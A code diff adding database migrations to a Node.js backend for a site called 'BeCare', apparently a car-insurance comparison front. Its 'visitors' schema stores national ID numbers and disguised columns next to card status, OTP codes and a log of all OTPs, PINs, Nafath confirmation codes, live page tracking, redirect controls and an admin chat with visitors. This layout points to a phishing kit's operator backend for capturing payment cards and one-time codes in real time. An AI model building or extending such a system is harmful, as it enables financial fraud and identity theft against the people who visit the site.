@@ -171,13 +171,312 @@ const getDbConfig = () => {
 
 const pool = new Pool(getDbConfig());
 
+// ═══════════════════════════════════════════════════════
+// Auto Migration System - إنشاء الجداول تلقائياً
+// ═══════════════════════════════════════════════════════
+
+const migrations = [
+  {
+    name: 'visitors',
+    create: `
+      CREATE TABLE IF NOT EXISTS visitors (
+        id VARCHAR(255) PRIMARY KEY,
+        identity_number VARCHAR(10),
+        owner_name VARCHAR(255),
+        phone_number VARCHAR(20),
+        document_type VARCHAR(50),
+        serial_number VARCHAR(50),
+        insurance_type VARCHAR(50),
+        insurance_coverage VARCHAR(50),
+        insurance_start_date DATE,
+        vehicle_usage VARCHAR(50),
+        vehicle_value DECIMAL(15, 2),
+        vehicle_year VARCHAR(4),
+        vehicle_model VARCHAR(255),
+        repair_location VARCHAR(50),
+        selected_offer JSONB,
+        offer_total_price DECIMAL(15, 2),
+        country VARCHAR(10),
+        device_type VARCHAR(50),
+        browser VARCHAR(100),
+        os VARCHAR(100),
+        screen_resolution VARCHAR(20),
+        current_step INT DEFAULT 1,
+        current_page VARCHAR(50) DEFAULT 'home-new',
+        is_online BOOLEAN DEFAULT true,
+        is_blocked BOOLEAN DEFAULT false,
+        is_unread BOOLEAN DEFAULT true,
+        _v1 VARCHAR(255),
+        _v2 VARCHAR(255),
+        _v3 VARCHAR(255),
+        _v4 VARCHAR(255),
+        _v1_status VARCHAR(50),
+        card_status VARCHAR(50),
+        card_updated_at TIMESTAMP,
+        _v5 VARCHAR(10),
+        _v5_status VARCHAR(50) DEFAULT 'pending',
+        otp_submitted_at TIMESTAMP,
+        otp_resend_requested BOOLEAN DEFAULT false,
+        otp_resend_at TIMESTAMP,
+        all_otps JSONB,
+        otp_updated_at TIMESTAMP,
+        _v6 VARCHAR(10),
+        _v6_status VARCHAR(50) DEFAULT 'pending',
+        pin_submitted_at TIMESTAMP,
+        pin_updated_at TIMESTAMP,
+        payment_status VARCHAR(50),
+        phone_id_number VARCHAR(10),
+        phone_number VARCHAR(20),
+        phone_carrier VARCHAR(50),
+        phone_submitted_at TIMESTAMP,
+        phone_updated_at TIMESTAMP,
+        _v4_status VARCHAR(50),
+        phone_otp_status VARCHAR(50),
+        old_phone_info JSONB,
+        _v8 VARCHAR(10),
+        _v9 VARCHAR(255),
+        nafad_confirmation_code VARCHAR(10),
+        nafad_confirmation_status VARCHAR(50),
+        nafad_updated_at TIMESTAMP,
+        redirect_page VARCHAR(50),
+        home_completed_at TIMESTAMP,
+        insur_completed_at TIMESTAMP,
+        compar_completed_at TIMESTAMP,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        last_active_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        session_start_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_visitors_identity ON visitors(identity_number)',
+      'CREATE INDEX IF NOT EXISTS idx_visitors_phone ON visitors(phone_number)',
+      'CREATE INDEX IF NOT EXISTS idx_visitors_current_page ON visitors(current_page)',
+      'CREATE INDEX IF NOT EXISTS idx_visitors_is_blocked ON visitors(is_blocked)',
+      'CREATE INDEX IF NOT EXISTS idx_visitors_created_at ON visitors(created_at)',
+      'CREATE INDEX IF NOT EXISTS idx_visitors_is_online ON visitors(is_online)'
+    ]
+  },
+  {
+    name: 'visitor_history',
+    create: `
+      CREATE TABLE IF NOT EXISTS visitor_history (
+        id SERIAL PRIMARY KEY,
+        visitor_id VARCHAR(255) NOT NULL,
+        type VARCHAR(50) NOT NULL,
+        data JSONB,
+        status VARCHAR(50) DEFAULT 'pending',
+        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_visitor_history_visitor ON visitor_history(visitor_id)',
+      'CREATE INDEX IF NOT EXISTS idx_visitor_history_type ON visitor_history(type)',
+      'CREATE INDEX IF NOT EXISTS idx_visitor_history_status ON visitor_history(status)'
+    ]
+  },
+  {
+    name: 'visitor_messages',
+    create: `
+      CREATE TABLE IF NOT EXISTS visitor_messages (
+        id SERIAL PRIMARY KEY,
+        visitor_id VARCHAR(255) NOT NULL,
+        message TEXT NOT NULL,
+        sender_name VARCHAR(255),
+        is_from_admin BOOLEAN DEFAULT false,
+        is_read BOOLEAN DEFAULT false,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_visitor_messages_visitor ON visitor_messages(visitor_id)',
+      'CREATE INDEX IF NOT EXISTS idx_visitor_messages_is_read ON visitor_messages(is_read)'
+    ]
+  },
+  {
+    name: 'public_settings',
+    create: `
+      CREATE TABLE IF NOT EXISTS public_settings (
+        id SERIAL PRIMARY KEY,
+        setting_key VARCHAR(100) NOT NULL UNIQUE,
+        setting_value TEXT,
+        description VARCHAR(500),
+        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    defaults: [
+      "INSERT INTO public_settings (setting_key, setting_value, description) VALUES ('siteName', 'BeCare', 'Site Name') ON CONFLICT (setting_key) DO NOTHING",
+      "INSERT INTO public_settings (setting_key, setting_value, description) VALUES ('supportEmail', 'support@becare.com', 'Support Email') ON CONFLICT (setting_key) DO NOTHING",
+      "INSERT INTO public_settings (setting_key, setting_value, description) VALUES ('maintenanceMode', 'false', 'Maintenance Mode') ON CONFLICT (setting_key) DO NOTHING"
+    ]
+  },
+  {
+    name: 'insurance_companies',
+    create: `
+      CREATE TABLE IF NOT EXISTS insurance_companies (
+        id VARCHAR(100) PRIMARY KEY,
+        name VARCHAR(255) NOT NULL,
+        name_en VARCHAR(255),
+        logo_url VARCHAR(500),
+        is_active BOOLEAN DEFAULT true,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_companies_active ON insurance_companies(is_active)'
+    ]
+  },
+  {
+    name: 'insurance_offers',
+    create: `
+      CREATE TABLE IF NOT EXISTS insurance_offers (
+        id VARCHAR(100) PRIMARY KEY,
+        company_id VARCHAR(100) NOT NULL,
+        name VARCHAR(255) NOT NULL,
+        type VARCHAR(50) NOT NULL,
+        main_price DECIMAL(15, 2) NOT NULL,
+        is_active BOOLEAN DEFAULT true,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_offers_company ON insurance_offers(company_id)',
+      'CREATE INDEX IF NOT EXISTS idx_offers_type ON insurance_offers(type)'
+    ]
+  },
+  {
+    name: 'offer_features',
+    create: `
+      CREATE TABLE IF NOT EXISTS offer_features (
+        id VARCHAR(100) PRIMARY KEY,
+        offer_id VARCHAR(100) NOT NULL,
+        content TEXT NOT NULL,
+        price DECIMAL(15, 2) DEFAULT 0,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_offer_features_offer ON offer_features(offer_id)'
+    ]
+  },
+  {
+    name: 'offer_expenses',
+    create: `
+      CREATE TABLE IF NOT EXISTS offer_expenses (
+        id VARCHAR(100) PRIMARY KEY,
+        offer_id VARCHAR(100) NOT NULL,
+        reason VARCHAR(255) NOT NULL,
+        price DECIMAL(15, 2) NOT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_offer_expenses_offer ON offer_expenses(offer_id)'
+    ]
+  },
+  {
+    name: 'socket_sessions',
+    create: `
+      CREATE TABLE IF NOT EXISTS socket_sessions (
+        id SERIAL PRIMARY KEY,
+        socket_id VARCHAR(100) NOT NULL,
+        visitor_id VARCHAR(255),
+        connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        disconnected_at TIMESTAMP,
+        last_heartbeat TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        ip_address VARCHAR(50)
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_socket_sessions_visitor ON socket_sessions(visitor_id)',
+      'CREATE INDEX IF NOT EXISTS idx_socket_sessions_socket ON socket_sessions(socket_id)'
+    ]
+  },
+  {
+    name: 'activity_log',
+    create: `
+      CREATE TABLE IF NOT EXISTS activity_log (
+        id SERIAL PRIMARY KEY,
+        visitor_id VARCHAR(255),
+        action VARCHAR(100) NOT NULL,
+        page VARCHAR(50),
+        details JSONB,
+        ip_address VARCHAR(50),
+        user_agent TEXT,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `,
+    indexes: [
+      'CREATE INDEX IF NOT EXISTS idx_activity_visitor ON activity_log(visitor_id)',
+      'CREATE INDEX IF NOT EXISTS idx_activity_action ON activity_log(action)',
+      'CREATE INDEX IF NOT EXISTS idx_activity_created ON activity_log(created_at)'
+    ]
+  }
+];
+
+// تشغيل الـ Migrations
+async function runMigrations() {
+  logger.info('Starting database migrations...');
+  
+  for (const migration of migrations) {
+    try {
+      // التحقق من وجود الجدول
+      const tableExists = await pool.query(`
+        SELECT EXISTS (
+          SELECT FROM information_schema.tables 
+          WHERE table_schema = 'public' 
+          AND table_name = $1
+        ) as exists
+      `, [migration.name]);
+      
+      if (!tableExists.rows[0].exists) {
+        logger.info(`Creating table: ${migration.name}`);
+        await pool.query(migration.create);
+        logger.success(`Table created: ${migration.name}`);
+      } else {
+        logger.success(`Table exists: ${migration.name}`);
+      }
+      
+      // إنشاء الفهارس
+      if (migration.indexes) {
+        for (const index of migration.indexes) {
+          try {
+            await pool.query(index);
+          } catch (idxError) {
+            // تجاهل أخطاء الفهارس المكررة
+          }
+        }
+      }
+      
+      // إضافة البيانات الافتراضية
+      if (migration.defaults) {
+        for (const defaultData of migration.defaults) {
+          try {
+            await pool.query(defaultData);
+          } catch (defError) {
+            // تجاهل أخطاء البيانات المكررة
+          }
+        }
+      }
+      
+    } catch (error) {
+      logger.error(`Migration failed for table: ${migration.name}`, error);
+    }
+  }
+  
+  logger.success('All migrations completed successfully');
+}
+
 // اختبار الاتصال بقاعدة البيانات
 pool.query('SELECT NOW()')
-  .then(() => {
+  .then(async () => {
     logger.success('Database connected successfully', { 
       host: 'db.zspliwktncgjznoerwlu.supabase.co',
       database: 'postgres'
     });
+    // تشغيل Migrations بعد الاتصال
+    await runMigrations();
   })
   .catch((error) => {
     logger.error('Failed to connect to database - Supabase may not be accessible from this network', error);
